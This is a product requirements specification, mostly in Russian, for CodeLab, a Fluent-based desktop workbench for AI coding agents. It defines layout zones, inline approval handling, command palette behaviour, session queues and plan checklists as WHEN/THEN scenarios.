## Purpose

Десктопный workbench UI на базе Fluent: layout, организация виджетов `codelab_ui` по Atomic Design, паттерны взаимодействия, нужные agent workbench (сайдбар сессий, approvals, режимы отображения, командная палитра и т. д.), и клавиатурная эргономика.
## Requirements
### Requirement: Десктопный workbench на Fluent
CodeLab SHALL использовать `fluent_ui` как базовый Flutter UI framework и SHALL NOT использовать Material/Cupertino как базовый design framework.

#### Scenario: Проверяется UI framework
- **WHEN** анализируются UI-пакеты
- **THEN** публичные UI-компоненты CodeLab построены на `fluent_ui`

#### Scenario: Требуется совместимый импорт
- **WHEN** сторонний пакет требует совместимости с Material/Cupertino
- **THEN** импорт изолирован и не определяет публичный UI-стиль CodeLab

### Requirement: Layout workbench
CodeLab SHALL предоставлять десктопный layout workbench из четырёх зон (`dart-agent-and-clients` §12.3 A13, шаг 0): app bar, сайдбар сессий по проектам, панель сессии с лентой и композером, док панелей инструментов справа. Постоянной колонки инспектора и отдельной карточки debug log SHALL NOT быть: их содержимое — панели дока.

#### Scenario: Открывается основное рабочее пространство
- **WHEN** пользователь открывает CodeLab
- **THEN** первый экран — рабочий workbench клиента, а не маркетинговая страница

#### Scenario: Зоны рабочего места
- **WHEN** открыт workbench в окне шириной 1440 px с активной сессией и открытой панелью Plan
- **THEN** сверху app bar, слева сайдбар сессий, в центре панель сессии со своей шапкой, лентой и композером, справа док с вкладкой Plan

#### Scenario: Узкое окно адаптируется
- **WHEN** ширина окна меньше 900 px
- **THEN** сайдбар и док скрыты и открываются поверх контента, а лента и композер занимают всю ширину, не скрывая prompt composer или состояние отмены

### Requirement: Организация виджетов по Atomic Design
CodeLab SHALL организовывать переиспользуемые виджеты `codelab_ui` по `atomics`, `molecules` и `organisms`.

#### Scenario: Добавляется atomic-виджет
- **WHEN** реализуется минимальный переиспользуемый control
- **THEN** он размещается в `atomics`

#### Scenario: Добавляется панель workflow
- **WHEN** реализуется крупный блок workflow, такой как transcript, approval или сайдбар сессий
- **THEN** он размещается в `organisms`

### Requirement: Паттерны взаимодействия agent workbench
CodeLab SHALL поддерживать сайдбар сессий/задач, control strip области prompt, селектор режима разрешений, plan mode, inline approvals, режимы отображения, progress checklist, inspector-first детали, командную палитру или slash-команды, review-first изменения, изоляцию сессий, компактный transcript и context indicators.

#### Scenario: Показывается ожидающий approval
- **WHEN** агент запрашивает разрешение во время prompt turn
- **THEN** CodeLab отображает approval как часть записи transcript того tool call, к которому он относится (не как отдельную закреплённую панель вне ленты), с риском, причиной, командой/cwd/diff, если доступны — интерактивно, до момента решения

#### Scenario: Несколько approval ожидают решения одновременно
- **WHEN** активный prompt turn имеет более одного `ApprovalRequest` со статусом pending (параллельные tool calls)
- **THEN** CodeLab отображает каждый approval интерактивно на месте своей записи transcript, независимо от остальных — ни один не скрывает и не блокирует отображение другого

#### Scenario: Approval остаётся в истории после решения
- **WHEN** пользователь выбирает опцию для approval, или turn отменяется с этим approval в статусе `cancelled`
- **THEN** CodeLab не удаляет запись из transcript и не сбрасывает её к состоянию до approval — запись схлопывается в компактный маркер принятого решения (выбранная опция или "Cancelled"), остающийся видимым в истории; если approval отменён, а тег статуса вызова уже читается "Cancelled", маркером служит этот тег и второй тег "Cancelled" не показывается (решение пользователя 2026-11-09, design.md change `add-provider-setup-ui`, Q38)

#### Scenario: Отменённый ход с ожидающим approval — один тег Cancelled
- **WHEN** пользователь отменяет ход, пока вызов инструмента ждёт решения approval (объявленный `tool_call` или вызов только из `session/request_permission`)
- **THEN** строка вызова показывает один тег "Cancelled" — тег статуса; тега исхода approval рядом нет, тега "Queued" нет

#### Scenario: Решённый approval рядом с другим статусом
- **WHEN** approval решён выбором опции (`allowed`, `rejected`) или отменён, а вызов затем получил итоговый статус, отличный от "Cancelled" (например, поздний `completed`)
- **THEN** строка показывает и тег исхода approval, и тег статуса вызова, как прежде

#### Scenario: Лента автоскроллится к новому approval
- **WHEN** появляется новый pending approval, и пользователь не проскроллил ленту transcript вверх (не читает более раннюю историю)
- **THEN** CodeLab прокручивает ленту так, чтобы новая approval-запись была видна, не требуя от пользователя искать её вручную

#### Scenario: Клавиатурные approve/reject применяются к самому раннему pending approval
- **WHEN** несколько approval активного turn ожидают решения одновременно, и пользователь использует клавиатурный shortcut approve/reject
- **THEN** CodeLab применяет это решение к approval с наименьшим `requestedAt` среди pending — не к произвольному или к тому, что ближе к текущей scroll-позиции

#### Scenario: Меняется режим отображения
- **WHEN** пользователь выбирает `summary`, `normal` или `verbose`
- **THEN** transcript и детали tool call меняют детализацию, не теряя данных

#### Scenario: Содержательный текст записи не обрезается ни в одном режиме отображения
- **WHEN** запись transcript содержит содержательный текст (реплика пользователя, ответ агента, причина approval-запроса или диагностическое сообщение) длиннее, чем помещается в отведённое по умолчанию число строк
- **THEN** CodeLab отображает этот текст полностью независимо от выбранного `viewMode` — обрезка по числу строк применяется только к вспомогательным меткам и к детализации tool call, но не к самому содержательному тексту записи

#### Scenario: Переключение сессий показывает только состояние этой сессии
- **WHEN** пользователь переключает активную сессию (через сайдбар или создав новую)
- **THEN** CodeLab показывает собственные transcript, записи инспектора и pending approval этой сессии (если есть) — никогда не состояние, оставшееся от предыдущей активной сессии

### Requirement: Tool call появляется в transcript в хронологической позиции
CodeLab SHALL добавлять запись transcript для каждого tool call, полученного в активном или последнем prompt turn, в позицию потока, соответствующую моменту его создания агентом (`SessionUpdate.toolCall`) относительно окружающих текстовых записей — а не только показывать его в инспекторе.

#### Scenario: Tool call между двумя текстовыми ответами
- **WHEN** агент присылает текстовый чанк, затем `SessionUpdate.toolCall`, затем ещё один текстовый чанк
- **THEN** CodeLab показывает в transcript три записи в этом же порядке: текст, tool call, текст

#### Scenario: Обновление статуса tool call не создаёт вторую запись
- **WHEN** после `SessionUpdate.toolCall` для того же `toolCallId` приходит один или более `SessionUpdate.toolCallUpdate`
- **THEN** CodeLab обновляет содержимое и статус уже существующей записи transcript этого tool call, не добавляя новую

### Requirement: Approval options are rendered and bound to shortcuts by kind
CodeLab SHALL carry each approval option's `PermissionOptionKind` (`allow_once`, `allow_always`, `reject_once`, `reject_always`) through to the presentation layer and SHALL bind each kind to a fixed keyboard shortcut, without relying on matching substrings in the option's agent-provided label text.

#### Scenario: Four kinds shown distinctly
- **WHEN** a permission request offers all four standard option kinds
- **THEN** CodeLab shows four distinct options, each bound to its own shortcut, regardless of the exact wording of each option's label

#### Scenario: Non-English or unusual option labels still get shortcuts
- **WHEN** an agent provides an option label that does not contain the words "allow"/"approve"/"reject"/"deny" (e.g. a non-English label)
- **THEN** CodeLab still binds the correct shortcut to that option, based on its `kind`, not its label text

### Requirement: Approval panel offers a collapsed raw input view
CodeLab SHALL show the tool call's raw input in the approval panel behind a collapsed, expand-on-demand disclosure, not always visible by default.

#### Scenario: Raw input is collapsed by default
- **WHEN** an approval panel is shown for a tool call with input data
- **THEN** the raw input is hidden behind a "View raw input" control until the user expands it

### Requirement: Клавиатурный десктопный UX
CodeLab SHALL поддерживать клавиатурную эргономику для отправки prompt, отмены, approve/reject, командной палитры или slash-команд, создания сессии и сворачивания сайдбара.

#### Scenario: Пользователь отправляет prompt с клавиатуры
- **WHEN** фокус в prompt composer, и пользователь вызывает shortcut отправки
- **THEN** CodeLab отправляет prompt без необходимости взаимодействия с указателем

#### Scenario: Пользователь открывает командную палитру
- **WHEN** пользователь вызывает shortcut командной палитры
- **THEN** CodeLab представляет основные действия, такие как `/new`, `/plan`, `/permissions`, `/logs`, `/compact` и `/reconnect`

#### Scenario: Новая сессия с клавиатуры
- **WHEN** соединение установлено, и пользователь нажимает Cmd/Ctrl+N
- **THEN** CodeLab создаёт новую сессию в выбранном проекте и делает её активной

#### Scenario: Сайдбар сворачивается с клавиатуры
- **WHEN** окно шире 900 px, и пользователь нажимает Cmd/Ctrl+B
- **THEN** сайдбар сворачивается, а повторное нажатие разворачивает его; лента и текст композера при этом не теряются

### Requirement: Командная палитра открывается и выполняет доступные действия
CodeLab SHALL открывать `CodeLabCommandPaletteSurface` при вызове shortcut'а командной палитры и SHALL выполнять `/new` (создание сессии) и `/reconnect` (переподключение активного transport) немедленно при выборе, закрывая палитру после этого.

#### Scenario: Открытие командной палитры показывает surface
- **WHEN** пользователь вызывает shortcut командной палитры (`Ctrl/Cmd+K`)
- **THEN** CodeLab показывает `CodeLabCommandPaletteSurface` поверх workbench

#### Scenario: Закрытие командной палитры
- **WHEN** командная палитра открыта, и пользователь нажимает `Esc` либо выбирает доступную команду
- **THEN** CodeLab скрывает `CodeLabCommandPaletteSurface` и возвращает фокус клавиатуры workbench

#### Scenario: Выбор /new создаёт сессию
- **WHEN** командная палитра открыта, и пользователь выбирает `/new`
- **THEN** CodeLab создаёт новую сессию через существующий флоу создания сессии и закрывает палитру

#### Scenario: Выбор /reconnect переподключает активный transport
- **WHEN** командная палитра открыта, и пользователь выбирает `/reconnect`
- **THEN** CodeLab вызывает существующий флоу reconnect для активного transport и закрывает палитру

#### Scenario: Выбор /logs открывает полноэкранный log viewer
- **WHEN** командная палитра открыта, и пользователь выбирает `/logs`
- **THEN** CodeLab открывает полноэкранный log viewer (master-detail, поверх притемнённого workbench) и закрывает палитру

### Requirement: Командная палитра открывается inline из prompt composer
CodeLab SHALL открывать командную палитру inline, привязанную над prompt composer и без переноса фокуса клавиатуры с него, когда пользователь вводит `/` как первый символ нового слова в поле ввода composer, и SHALL фильтровать видимые команды вживую по мере того, как пользователь продолжает печатать в composer.

#### Scenario: Слэш в начале слова открывает inline-палитру
- **WHEN** composer пуст, либо курсор находится сразу после пробела, и пользователь вводит `/`
- **THEN** CodeLab показывает командную палитру, привязанную над composer, фокус остаётся в текстовом поле composer

#### Scenario: Слэш внутри слова не открывает палитру
- **WHEN** пользователь вводит `/` сразу после непробельного символа (например, как часть уже набираемого пути или URL)
- **THEN** CodeLab не открывает командную палитру

#### Scenario: Продолжение ввода фильтрует inline-список
- **WHEN** inline-палитра открыта, и пользователь вводит дополнительные символы в composer
- **THEN** CodeLab фильтрует видимые команды по тексту, набранному после триггерного `/`

#### Scenario: Enter выбирает подсвеченную команду, пока открыта inline-палитра
- **WHEN** inline-палитра открыта, и пользователь нажимает `Enter`
- **THEN** CodeLab выбирает текущую подсвеченную команду вместо вставки переноса строки в composer

#### Scenario: Выбор команды из inline-палитры очищает текст триггера
- **WHEN** пользователь выбирает команду из inline-палитры
- **THEN** CodeLab удаляет фрагмент `/word` из текста composer и выполняет команду тем же способом, что и при выборе через палитру, вызванную клавиатурным shortcut'ом

#### Scenario: Удаление триггерного слэша закрывает inline-палитру
- **WHEN** inline-палитра открыта, и пользователь удаляет символ `/`, который её вызвал
- **THEN** CodeLab закрывает inline-палитру, не выполняя никакой команды

### Requirement: Командная палитра честно помечает нереализованные действия как недоступные
CodeLab SHALL представлять `/plan`, `/permissions` и `/compact` в командной палитре как явно недоступные действия, а не тихо ничего не делать при их выборе, пока каждая соответствующая capability (plan mode, селектор режима разрешений, compact transcript) не реализована. Недоступная команда клиента SHALL скрываться из палитры, пока активный агент объявляет команду с тем же именем (сравнение без `/`, с учётом регистра), и SHALL возвращаться, когда новый `availableCommandsUpdate` это имя больше не содержит.

#### Scenario: Выбрана недоступная команда
- **WHEN** командная палитра открыта, и пользователь выбирает `/plan`, `/permissions` или `/compact`
- **THEN** CodeLab показывает команду как disabled/с пометкой «coming soon» и не закрывает палитру, и не выдаёт фиктивную запись диагностики, подразумевающую, что действие завершилось

#### Scenario: Enter на недоступной команде в inline-палитре
- **WHEN** inline-палитра открыта, недоступная команда (`/plan`, `/permissions` или `/compact`) — текущая подсвеченная запись, и пользователь нажимает `Enter`
- **THEN** CodeLab обрабатывает это так же, как любой другой выбор этой команды — палитра остаётся открытой, никакое действие не выполняется, текст composer не меняется

#### Scenario: Команда агента вытесняет одноимённую заглушку
- **WHEN** активный агент объявил команду `compact`
- **THEN** палитра показывает `compact` в секции агента и не показывает недоступную команду клиента `/compact`; `/plan` и `/permissions`, которых агент не объявил, остаются недоступными командами клиента

#### Scenario: Заглушка возвращается
- **WHEN** после команды `compact` агент присылает `availableCommandsUpdate` без неё
- **THEN** палитра снова показывает недоступную команду клиента `/compact`

### Requirement: Командная палитра представляет команды, объявленные агентом
CodeLab SHALL представлять команды, объявленные активным агентом через `SessionUpdate.availableCommandsUpdate`, в командной палитре (и в surface `Ctrl/Cmd+K`, и во inline-триггере `/`), визуально отделённые от команд клиента, и SHALL NOT вызывать их как метод протокола — выбор одной из них SHALL вставлять `/{name} ` (плюс объявленный input hint, если есть, как placeholder-текст) в prompt composer вместо этого, оставляя пользователю дополнение и отправку как обычного prompt, — и для команды с `input`, и без него. Доступные команды клиента (`/new`, `/logs`, `/reconnect`) команды агента SHALL NOT заменять; недоступные заменяют по требованию «Командная палитра честно помечает нереализованные действия как недоступные». Палитра SHALL отбирать команды по введённому запросу нечётким поиском каталога команд kit: сначала команды, имя которых начинается с запроса, затем содержащие его, затем содержащие буквы запроса по порядку, затем совпавшие по названию или описанию.

#### Scenario: Агент объявляет доступные команды
- **WHEN** активная сессия получает `SessionUpdate.availableCommandsUpdate` с одной или более записями
- **THEN** CodeLab добавляет эти команды в палитру в секции, визуально отделённой от команд клиента, не удаляя и не заменяя ни одну доступную команду клиента

#### Scenario: Более позднее обновление заменяет список команд агента
- **WHEN** для активной сессии приходит новый `SessionUpdate.availableCommandsUpdate`
- **THEN** CodeLab заменяет ранее показанные команды агента записями из нового обновления

#### Scenario: Команды агента не объявлены
- **WHEN** активная сессия не получала ни одного `availableCommandsUpdate`
- **THEN** CodeLab показывает в палитре только шесть client-native команд

#### Scenario: Выбрана команда, объявленная агентом
- **WHEN** пользователь выбирает команду, пришедшую из `availableCommandsUpdate`
- **THEN** CodeLab вставляет `/{name} ` (и input hint команды как placeholder-текст, если команда его объявляет) в prompt composer, закрывает палитру и не вызывает никакой метод протокола — пользователь отправляет её сам через обычный флоу prompt

#### Scenario: Повторный выбор той же команды
- **WHEN** пользователь выбрал команду агента, стёр или отправил вставленный текст и снова выбирает ту же команду
- **THEN** CodeLab снова вставляет `/{name} ` в prompt composer

#### Scenario: Переключение сессий показывает собственные команды агента этой сессии
- **WHEN** активная сессия меняется
- **THEN** CodeLab показывает собственные команды агента, объявленные для новой активной сессии — восстановленные из её последнего `availableCommandsUpdate`, если он был, либо пустой список, если не было — но никогда список предыдущей сессии

#### Scenario: Нечёткий поиск находит команду по буквам
- **WHEN** агент объявил `compact`, и пользователь вводит в палитре `cpt`
- **THEN** палитра показывает `compact`, хотя `cpt` не подстрока ни имени, ни описания

#### Scenario: Префикс имени выше совпадения в описании
- **WHEN** агент объявил `plan` и команду, в описании которой есть слово `plan`, и пользователь вводит `/pl`
- **THEN** `plan` — первая команда агента в списке палитры

### Requirement: Композер показывает объявленные агентом config options
CodeLab SHALL показывать в prompt composer по одному селектору на каждый `SessionConfigOption` активной сессии, в порядке, присланном агентом, и SHALL NOT показывать этот ряд, когда `configOptions` активной сессии пуст или отсутствует.

#### Scenario: Агент объявляет config options при создании сессии
- **WHEN** ответ на создание сессии содержит непустой `configOptions`
- **THEN** CodeLab показывает в композере по одному селектору на каждую опцию, с текущим значением (`currentValue`) из ответа

#### Scenario: Агент не объявляет ни одной config option
- **WHEN** активная сессия не имеет ни одной `SessionConfigOption`
- **THEN** CodeLab не показывает ряд селекторов в композере вообще — ни пустым, ни как «coming soon»

#### Scenario: Обновление config options во время сессии
- **WHEN** активная сессия получает `SessionUpdate.configOptionUpdate` с новым списком
- **THEN** CodeLab заменяет ряд селекторов в композере полностью новым списком, включая появление или исчезновение ряда при переходе списка из пустого в непустой и обратно

### Requirement: Выбор значения селектора отправляется агенту
CodeLab SHALL отправлять `session/set_config_option` при выборе пользователем нового значения в селекторе композера и SHALL отражать в чипе значение из ответа агента, а не выбранное пользователем значение напрямую.

#### Scenario: Пользователь выбирает значение из выпадающего списка
- **WHEN** пользователь открывает селектор конфигурации и выбирает один из вариантов `options`
- **THEN** CodeLab отправляет `session/set_config_option` с `configId` и выбранным значением, дожидается ответа и обновляет отображаемое в чипе значение из полученного списка `configOptions`

#### Scenario: Селектор не смешивается с client-side permission mode
- **WHEN** активная сессия объявляет `SessionConfigOption` с `category: "mode"`
- **THEN** CodeLab отображает его название и варианты как есть, присланные агентом, не подставляя названия локальных режимов `readOnly`/`ask`/`plan`/`autoEdits` из `approval-safety` и не смешивая эти два понятия

### Requirement: Workbench честно отражает спонтанную потерю соединения
CodeLab SHALL отражать спонтанную (не инициированную явным `connect()`/`reconnect()`) потерю ACP-соединения как отдельное состояние `lost` в UI, отличное от неудачной попытки подключения `failed`, и SHALL очищать состояние активного запроса, которое больше не может считаться достоверным, вместо того чтобы бесконечно показывать `Connected` и зависший `running` turn.

#### Scenario: Агент падает во время активной сессии
- **WHEN** активное соединение (`connectionStatus == connected`) спонтанно теряется — например, дочерний процесс агента завершается неожиданно
- **THEN** CodeLab переводит `connectionStatus` в `lost`, очищает `pendingApproval`, `isPromptSubmitting`, `canCancel`, `isRespondingToApproval` и `isRespondingToConfigOption`, и записывает диагностику с причиной

#### Scenario: Explicit connect/reconnect failure не задваивается
- **WHEN** пользователь явно вызывает `Connect`/`Reconnect`, и попытка завершается неудачей
- **THEN** CodeLab переводит `connectionStatus` в `failed` и показывает ровно одну diagnostic-запись об этой неудаче — реакция на спонтанную потерю соединения не создаёт вторую, дублирующую запись для того же события

#### Scenario: История сессии не теряется при потере соединения
- **WHEN** происходит спонтанная потеря соединения
- **THEN** CodeLab сохраняет видимыми `transcriptEntries` уже случившейся сессии — они не считаются недостоверными, в отличие от состояния активного запроса

### Requirement: Границы панелей перетаскиваются мышью
CodeLab SHALL позволять пользователю менять ширину сайдбара сессий и дока панелей инструментов перетаскиванием их общей границы с панелью сессии, когда они стоят колонками, в пределах фиксированных минимума и максимума.

#### Scenario: Перетаскивание границы сайдбара меняет его ширину
- **WHEN** пользователь перетаскивает разделитель между сайдбаром и панелью сессии
- **THEN** CodeLab меняет ширину сайдбара в реальном времени, следуя за курсором, а панель сессии заполняет оставшееся пространство

#### Scenario: Перетаскивание границы дока меняет его ширину
- **WHEN** окно шире 1280 px, док открыт колонкой, и пользователь перетаскивает разделитель между панелью сессии и доком
- **THEN** CodeLab меняет ширину дока в реальном времени, следуя за курсором

#### Scenario: Resize ограничен минимальной шириной
- **WHEN** пользователь тянет разделитель к ширине меньше настроенного минимума
- **THEN** CodeLab останавливает сжатие панели на минимальной ширине, никогда не схлопывая её до нуля

#### Scenario: Resize ограничен максимальной шириной
- **WHEN** пользователь тянет разделитель к ширине больше настроенного максимума
- **THEN** CodeLab останавливает рост панели на максимальной ширине, никогда не давая ей поглотить панель сессии

#### Scenario: Курсор показывает перетаскиваемую границу
- **WHEN** курсор наведён на перетаскиваемый разделитель, до начала перетаскивания
- **THEN** CodeLab показывает курсор горизонтального изменения размера

#### Scenario: Ширина дока переживает перезапуск
- **WHEN** пользователь изменил ширину дока и перезапустил CodeLab
- **THEN** док открывается с той же шириной

### Requirement: Схлопывание потоковых сообщений агента в transcript
CodeLab SHALL отображать подряд идущие потоковые обновления одного и того же рода (`agent_message_chunk` либо `agent_thought_chunk`) в рамках одного prompt turn как единую, дописывающуюся запись transcript, а не как отдельную запись на каждое обновление. CodeLab SHALL начинать новую запись transcript всякий раз, когда между такими обновлениями встречается обновление turn другого рода, либо когда род потокового обновления меняется (сообщение ↔ размышление).

#### Scenario: Агент стримит текст ответа несколькими чанками подряд
- **WHEN** активный prompt turn получает несколько подряд идущих `agent_message_chunk` обновлений без других обновлений turn между ними
- **THEN** CodeLab показывает единственную запись transcript, текст которой дополняется по мере поступления новых чанков, а не отдельную запись на каждый чанк

#### Scenario: Другое обновление turn прерывает серию чанков сообщения
- **WHEN** между двумя `agent_message_chunk` обновлениями одного turn приходит обновление другого рода (например, обновление вызова инструмента)
- **THEN** CodeLab начинает новую запись transcript для текста, пришедшего после этого обновления, не склеивая его с текстом, пришедшим до него

#### Scenario: Род потокового обновления меняется с сообщения на размышление
- **WHEN** подряд идущие потоковые обновления одного turn переключаются с `agent_message_chunk` на `agent_thought_chunk` (или наоборот)
- **THEN** CodeLab начинает новую запись transcript, не склеивая текст разных родов обновления в одну запись

#### Scenario: Turn ещё выполняется, ответ агента ещё не завершён
- **WHEN** prompt turn ещё выполняется и агент уже прислал часть текста ответа через потоковые обновления
- **THEN** CodeLab показывает уже полученную часть текста в соответствующей записи transcript, не дожидаясь завершения turn

### Requirement: Project selection is independent of the connection type
CodeLab SHALL let the user select the working directory ("project") for sessions as an action independent of the connection profile, and SHALL apply the currently selected project to the next session created regardless of whether the active profile is the embedded agent, stdio or WebSocket. Whether a stdio agent process starts in the project directory SHALL be the `Run in the project folder` field of that stdio profile (`runInProjectDirectory`, default on in the "Add connection profile" dialog), not a separate workbench toggle (design.md change `add-app-settings-shell`, D6).

#### Scenario: Project applies to a WebSocket session
- **WHEN** CodeLab is connected via WebSocket and the user creates a new session
- **THEN** CodeLab sends the currently selected project's path as `cwd` in `session/new`, the same as it would for stdio

#### Scenario: No project selected falls back to the current process directory
- **WHEN** the user creates a session and no project has been explicitly selected
- **THEN** CodeLab uses the same fallback it uses today (the CodeLab process's own current directory) as the session's `cwd`

#### Scenario: Switching connection does not clear the selected project
- **WHEN** the user reconnects or connects another profile from the Connection settings page while a project is selected
- **THEN** the selected project remains the same, and is used for the next session created after the switch

#### Scenario: stdio process runs from the project directory by default
- **WHEN** the current profile is a stdio profile with `Run in the project folder` on, and a project is selected (or none is, falling back to the current process directory)
- **THEN** CodeLab spawns the agent process with that same directory as its OS-level working directory

#### Scenario: stdio process spawn directory can be decoupled from the project
- **WHEN** the current profile is a stdio profile with `Run in the project folder` off
- **THEN** CodeLab spawns the agent process without an explicit working directory override, while the selected project's path is still sent as `cwd` in `session/new` for sessions created afterward

### Requirement: "Open Project" offers native browse and recent projects
CodeLab SHALL let the user switch projects from the sessions sidebar: recent project directories are shown as collapsed project groups for one-click reselection, and an "Open folder…" item opens the operating system's native folder-selection dialog.

#### Scenario: Picking a folder via the native dialog
- **WHEN** the user selects "Open folder…" in the sessions sidebar
- **THEN** CodeLab opens the operating system's native folder-selection dialog, and on a folder being chosen, sets it as the selected project

#### Scenario: Selecting a recent project
- **WHEN** the user expands a collapsed recent project group in the sidebar
- **THEN** CodeLab sets that path as the selected project without opening the native folder dialog, and that group lists the project's sessions

#### Scenario: Currently selected project is visible without opening a picker
- **WHEN** a project is selected
- **THEN** the sessions sidebar shows that project as an expanded group named after the folder, with the full path available as a tooltip

### Requirement: Recent projects persist across app restarts
CodeLab SHALL remember recently opened project directories across application restarts, on the local machine.

#### Scenario: A newly opened project appears in recents after restart
- **WHEN** the user opens a project directory (via browse or by it becoming the selected project) and then restarts CodeLab
- **THEN** that directory still appears in the "Open Project" recents list

#### Scenario: Recents list has a bound
- **WHEN** the number of distinct opened project directories exceeds the recents list's capacity
- **THEN** CodeLab keeps only the most recently opened entries, dropping the least recently used ones, rather than growing the list without bound

### Requirement: Progress checklist reflects the agent's plan
CodeLab SHALL render the agent's plan as a progress checklist, sourced from `SessionUpdate.plan` entries, showing each entry's priority and status without inventing statuses the protocol does not define.

#### Scenario: Plan update renders a checklist
- **WHEN** the active session receives a `SessionUpdate.plan` with one or more entries
- **THEN** CodeLab shows a checklist with one row per entry, each showing its status (pending/in_progress/completed) and priority (high/medium/low)

#### Scenario: No plan yet — no checklist shown
- **WHEN** the active session has not received any `plan` update
- **THEN** CodeLab does not show a checklist or an empty-state placeholder for it

#### Scenario: A later plan update replaces the checklist
- **WHEN** a new `SessionUpdate.plan` arrives for the active session
- **THEN** CodeLab replaces the displayed checklist with the entries from the new update

### Requirement: Docked plan summary below the transcript
CodeLab SHALL show a compact summary of the current plan docked below the transcript, directly above the composer, expandable into the full checklist by clicking anywhere on the summary row.

#### Scenario: Summary names the active step
- **WHEN** a plan has an entry with status in_progress and the summary is collapsed
- **THEN** the compact summary shows that entry's description, and a count of remaining pending entries if any remain

#### Scenario: Summary shows an aggregate count when nothing is in progress
- **WHEN** a plan has no entry with status in_progress, or the summary is expanded
- **THEN** the compact summary shows an aggregate count (total entries if none are completed yet, or completed-out-of-total otherwise) instead of naming a specific entry

#### Scenario: Summary is omitted when the plan is fully completed
- **WHEN** every entry in the current plan has status completed
- **THEN** CodeLab does not show the compact summary row, though the full checklist remains reachable until every entry is completed

#### Scenario: Dismissing the plan clears the summary until the next update
- **WHEN** the user dismisses the plan summary
- **THEN** CodeLab stops showing the plan summary and checklist for that session until a new plan update arrives

### Requirement: Full checklist has a bounded, independently scrollable height
CodeLab SHALL cap the expanded checklist's height and scroll its entries independently, so a long plan does not push the transcript or composer out of view.

#### Scenario: Plan with many entries stays within a bounded height
- **WHEN** the expanded checklist has more entries than fit in its maximum height
- **THEN** the entries scroll within the checklist without resizing the surrounding layout

### Requirement: Sessions run prompt turns independently of the active session
CodeLab SHALL allow a session's prompt turn to continue running while a different session is active, and SHALL allow the active session to start its own prompt turn even while another session's turn is still running, as long as the active session itself is not busy.

#### Scenario: Starting a second session while the first is still running
- **WHEN** a session has a prompt turn running or an approval pending, and the user creates or switches to a different, idle session
- **THEN** CodeLab lets the user submit a prompt in the newly active session immediately, without queuing it, regardless of the other session's state

#### Scenario: A background session's turn keeps running while another session is active
- **WHEN** a session's prompt turn is running while a different session is active
- **THEN** CodeLab does not cancel, pause, or otherwise interrupt the background session's turn — it continues until it completes, fails, or is explicitly cancelled

#### Scenario: A background session's turn completes while another session is active
- **WHEN** a non-active session's prompt turn completes, fails, or its approval is resolved while a different session is active
- **THEN** CodeLab updates that session's own transcript and status without altering the transcript, composer, or submitting state currently shown for the active session

### Requirement: Sessions sidebar shows live status for background sessions
CodeLab SHALL keep each session's status indicator in the sessions sidebar current — including idle, running, and awaiting-approval — regardless of whether that session is the currently active one.

#### Scenario: A background session's status updates as its turn progresses
- **WHEN** a non-active session's prompt turn starts running, requests an approval, or completes
- **THEN** the sessions sidebar reflects that session's current status without requiring the user to switch to it first

### Requirement: Messages queue instead of failing when the session is busy
CodeLab SHALL queue a submitted prompt client-side, without attempting to send it and without losing the typed text, when the active session cannot currently accept a new prompt turn (a turn is running or an approval is pending), instead of attempting the send and showing a failure.

#### Scenario: Submitting while awaiting approval queues the message
- **WHEN** user submits a prompt while the active session has a pending approval
- **THEN** CodeLab adds the message to the queue instead of sending it, and does not show a "prompt failed" entry in the transcript

#### Scenario: Submitting while a turn is running queues the message
- **WHEN** user submits a prompt while the active session's turn is still running
- **THEN** CodeLab adds the message to the queue instead of attempting to send it

#### Scenario: Submitting while the session is free sends immediately
- **WHEN** user submits a prompt while the active session is idle or active
- **THEN** CodeLab sends it immediately, unchanged from current behavior

#### Scenario: Another session being busy does not queue a message for the active session
- **WHEN** user submits a prompt in the active session while a *different* session has a turn running or an approval pending
- **THEN** CodeLab sends the message immediately, exactly as it would if no other session existed — only the active session's own busy state can cause queuing

### Requirement: Queued messages panel with per-item and bulk actions
CodeLab SHALL show a queued-messages panel, visible only when the queue is non-empty, offering Edit, Delete, and Send Now per item, and Clear All for the whole queue.

#### Scenario: Editing a queued message
- **WHEN** user selects Edit on a queued message
- **THEN** CodeLab removes it from the queue and places its text back into the prompt composer for editing

#### Scenario: Deleting a queued message
- **WHEN** user selects Delete on a queued message
- **THEN** CodeLab removes it from the queue without sending it

#### Scenario: Send Now attempts immediate delivery
- **WHEN** user selects Send Now on a queued message and the session is currently free
- **THEN** CodeLab sends that message immediately, out of FIFO order

#### Scenario: Send Now during a race returns the message to the queue
- **WHEN** user selects Send Now on a queued message but the session is still busy at that moment
- **THEN** CodeLab returns the message to its place in the queue without showing an error

#### Scenario: Clear All empties the queue
- **WHEN** user selects Clear All
- **THEN** CodeLab removes every queued message without sending any of them

### Requirement: Queue drains automatically when the session becomes free
CodeLab SHALL automatically send the oldest queued message once the active session returns to an idle/active state, without requiring user action.

#### Scenario: Oldest message sends automatically after the block clears
- **WHEN** the active session's turn completes or its pending approval is resolved, and the queue is non-empty
- **THEN** CodeLab automatically sends the oldest queued message

#### Scenario: A background session's own queue drains when its own turn completes
- **WHEN** a non-active session's turn completes or its pending approval is resolved while a different session is active, and that non-active session's own queue is non-empty
- **THEN** CodeLab automatically sends that session's oldest queued message, without requiring the user to switch to it first

### Requirement: Debug log — отдельная докнутая панель, не вложенная в Inspector
CodeLab SHALL отображать протокольные записи текущей сессии и debug log в панели Protocol дока инструментов как два отдельных раздела одной панели, а не как постоянные колонки workbench.

#### Scenario: Панель Protocol открывается переключателем
- **WHEN** пользователь нажимает переключатель Protocol в app bar или выбирает `/logs` в палитре
- **THEN** в доке открывается и становится активной вкладка Protocol

#### Scenario: Разделы панели не дублируют друг друга
- **WHEN** пользователь просматривает панель Protocol
- **THEN** раздел протокола показывает только approval/tool-call/protocol-записи текущей сессии, а раздел debug log — только structured-log события; ни одна запись не показана в обоих разделах

#### Scenario: Раздел debug log даёт поиск и фильтр по уровню
- **WHEN** пользователь вводит текст в поле поиска или выбирает минимальный уровень в разделе debug log
- **THEN** список записей ограничивается совпадающими по тексту и/или не ниже выбранного уровня

#### Scenario: Кнопка Expand открывает полноэкранный log viewer
- **WHEN** пользователь нажимает кнопку "Expand" в разделе debug log
- **THEN** CodeLab открывает тот же полноэкранный log viewer, что и раньше

#### Scenario: Селектор типа фильтрует записи по категории, когда их несколько
- **WHEN** в разделе debug log одновременно присутствуют записи двух и более категорий (например, `application` и `protocol`)
- **THEN** CodeLab показывает селектор по типу записи, позволяющий ограничить список одной категорией или снять ограничение

### Requirement: Полноэкранный log viewer — master-detail
